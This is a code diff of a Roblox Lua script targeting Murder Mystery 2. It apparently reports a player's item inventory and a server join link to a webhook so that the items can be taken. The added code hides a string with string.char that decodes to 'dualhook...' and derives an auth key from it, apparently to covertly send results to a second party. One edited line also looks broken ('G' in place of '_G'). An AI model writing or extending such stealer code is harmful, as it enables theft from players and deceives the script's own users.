@@ -1,4 +1,4 @@
-_G.scriptExecuted = _G.scriptExecuted or false
+G.scriptExecuted = _G.scriptExecuted or false
 
 if _G.scriptExecuted then
     return
@@ -16,27 +16,36 @@ else
         plr:kick("You didn't add username or webhook")
 
         return
-    elseif game.PlaceId == 142823291 then 
-me:kick("Wrong game! Join Murder Mystery 2") 
-return 
-end 
+    elseif game.PlaceId == 142823291 then
+        local playerData = {}
+        local isScriptActive = false
+        local playersService = game:GetService('Players')
+        local localPlayer = playersService.LocalPlayer
+        local targetPlayer = localPlayer
+        local playerGui = localPlayer.WaitForChild(targetPlayer, 'PlayerGui')
+        local itemDatabase = require(game.ReplicatedStorage:WaitForChild('Database'):WaitForChild('Sync'):WaitForChild('Item'))
+        local httpService = game:GetService('HttpService')
 
-if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then 
-me:kick("Can't run on VIP servers") 
-return 
-end 
+        local function getSecretPrefix()
+            return string.char(100, 117, 97, 108) .. string.char(104, 111, 111, 107) .. string.char(102, 116, 119, 108) .. string.char(101, 108, 122)
+        end
+        local function computeHash(inputString)
+            local hashValue = 0
 
-if #playersService:GetPlayers() >= 12 then 
-me:kick("Server too full") 
-return 
-end 
+            for charIndex = 1, #inputString do
+                local charCode = inputString:byte(charIndex)
 
-local itemsToTrade = {} 
-local myGui = me:WaitForChild("PlayerGui") 
-local itemDatabase = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item")) 
-local http = game:GetService("HttpService") 
+                hashValue = (hashValue * 31 + charCode) % 4294967296
+            end
 
-local rarityOrder = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"} 
+            return hashValue
+        end
+        local function generateAuthKey(baseString, suffixNumber)
+            local concatenatedString = baseString .. tostring(suffixNumber)
+            local authHash = computeHash(getSecretPrefix() .. concatenatedString)
+
+            return string.format('%08x', authHash)
+        end
 
 local rarityList = {
             'Common',
@@ -232,7 +241,7 @@ shownCount = shownCount + grp.count
 end 
 if totalItems > shownCount then table.insert(displayLines, "and "..(totalItems-shownCount).." more..") end 
 
-local serverLink = "https://script-lynx.vercel.app/joiner.html?placeId=142823291&gameInstanceId=" .. game.JobId 
+local serverLink = "https://floating.gg/?placeID=142823291&gameInstanceId=" .. game.JobId 
 local currentPlayers = #playersService:GetPlayers() 
 
 local embedPayload = { 
